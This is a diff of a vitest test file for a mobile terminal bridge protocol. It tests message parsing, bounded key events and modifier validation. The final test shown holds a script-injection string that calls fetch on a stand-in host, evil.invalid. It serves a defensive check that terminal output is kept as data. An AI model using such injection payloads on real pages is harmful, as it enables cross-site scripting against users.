@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest';
-import { allowTerminalNavigation, controlInput, hostMessageSchema, parsePageMessage, terminalFontSize } from './protocol';
+import { allowTerminalNavigation, emptyModifiers, hostMessageSchema, parsePageMessage, terminalFontSize } from './protocol';
 const identity = { viewId: 'page-1', epoch: '1' };
 describe('mobile terminal bridge protocol', () => {
   it('rejects malformed, excessive and unknown web messages', () => {
@@ -16,11 +16,15 @@ describe('mobile terminal bridge protocol', () => {
     expect(parsePageMessage(JSON.stringify({ type: 'rendered', ...identity, ticket: 5 }))).not.toBeNull();
     expect(parsePageMessage(JSON.stringify({ type: 'selection', ...identity, text: 'copy me' }))).not.toBeNull();
   });
-  it('translates sticky Ctrl without changing terminal escape sequences or Unicode', () => {
-    expect(controlInput('c', true)).toBe('\x03'); expect(controlInput('D', true)).toBe('\x04');
-    expect(controlInput('[', true)).toBe('\x1b'); expect(controlInput('?', true)).toBe('\x7f');
-    expect(controlInput('\x1b[A', true)).toBe('\x1b[A'); expect(controlInput('日本語', true)).toBe('日本語');
-    expect(controlInput('c', false)).toBe('c');
+  it('accepts bounded key events and rejects arbitrary DOM or OS commands', () => {
+    const message = { type: 'key', ...identity, event: { key: 'F12', modifiers: { ...emptyModifiers, ctrl: true } } };
+    expect(hostMessageSchema.parse(message)).toEqual(message);
+    expect(hostMessageSchema.parse({ type: 'modifiers', ...identity, modifiers: emptyModifiers })).toBeTruthy();
+    for (const key of ['F13', 'LaunchApp1', '\\x00', 'ab', 'Meta']) {
+      expect(hostMessageSchema.safeParse({ ...message, event: { ...message.event, key } }).success).toBe(false);
+    }
+    expect(hostMessageSchema.safeParse({ ...message, event: { ...message.event, key: 'c', code: 'KeyC' } }).success).toBe(false);
+    expect(hostMessageSchema.safeParse({ type: 'modifiers', ...identity, modifiers: { ctrl: true } }).success).toBe(false);
   });
   it('keeps terminal output as data, not executable source', () => {
     const data = '</script><script>fetch("https://evil.invalid")</script>';
